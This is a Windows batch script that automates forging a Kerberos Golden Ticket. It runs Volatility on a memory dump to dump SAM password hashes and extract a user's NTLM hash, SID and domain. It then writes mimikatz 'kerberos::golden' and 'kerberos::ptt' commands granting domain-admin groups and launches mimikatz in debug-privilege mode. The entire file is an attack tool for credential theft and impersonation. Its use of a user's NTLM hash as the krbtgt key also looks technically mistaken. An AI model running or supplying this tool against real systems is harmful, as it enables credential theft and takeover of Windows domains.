rem Script to interactively generate Kerberos Golden Tickets.
rem Requires mimikatz and volatility standalone executables in same directory, 
rem as well as a memory dump from a Windows machine.

@echo off
cls
echo "Deleting any previous files. Hit Ctrl-C to cancel."
rmdir .\output\
echo "All files will be stored in .\output"
mkdir .\output
timeout /t 1
cls
volatility-2.4.standalone.exe --info | findstr "Profile"
set /p profile="Select your OS profile from the list: "
echo "Profile set to %profile%."
set /p user="Select the user you wish to impersonate (Usually Administrator): "
set /p ticket="Enter the desired ticket name (Should end in .kirbi) : "
set /p dump="Enter path to memory dump: "
cls
timeout /t 5
cls
volatility-2.4.standalone.exe hivelist -f %dump% --profile=%profile% --output=text --output-file=".\output\hives.txt"
echo "Registry hives written to .\output\hives.txt; Wait 5 seconds."
timeout /t 5
type .\output\hives.txt | findstr "SAM" > .\output\samhive.txt
type .\output\hives.txt | findstr "SYSTEM" > .\output\systemhive.txt
for /f %%a in (.\output\samhive.txt) do echo %%a >> .\output\samhash.txt
for /f %%a in (.\output\systemhive.txt) do echo %%a >> .\output\systemhash.txt
set /p samhash= < .\output\samhash.txt
set /p systemhash= < .\output\systemhash.txt
volatility-2.4.standalone.exe hashdump -f %dump% --profile=%profile% -y %systemhash% -s %samhash% >> .\output\passwordhash.txt
cls
type .\output\passwordhash.txt | findstr "%user%" > .\output\userhash.txt
FOR /F "tokens=1-3 delims=:" %%a in (.\output\userhash.txt) do (
@echo %%a > .\output\username.txt
@echo %%c > .\output\ntlmhash.txt
)
whoami /user | findstr "\\" > .\output\usersid.txt
FOR /F "tokens=1-2 delims= " %%a in (.\output\usersid.txt) do (
@echo %%b > .\output\sid.txt
)
@echo %USERDOMAIN% > .\output\domain.txt
set /p username= < .\output\username.txt
set /p sid= < .\output\sid.txt
set /p ntlmhash= < .\output\ntlmhash.txt
set /p domain= < .\output\domain.txt
cls
echo "Copy and paste this line into mimikatz once it launches in privileged mode:" > .\output\mimikatz.txt
echo "kerberos::golden /user:%username% /domain:%domain% /sid:%sid% /krbtgt:%ntlmhash% /groups:513,512,520,518,519 /id:500 /ticket:%ticket%" >> .\output\mimikatz.txt
echo "To pass this ticket to your current session after generation, run:" >> .\output\mimikatz.txt
echo "kerberos::ptt %ticket%" >> .\output\mimikatz.txt
start notepad.exe ".\output\mimikatz.txt"
mimikatz "privilege::debug"
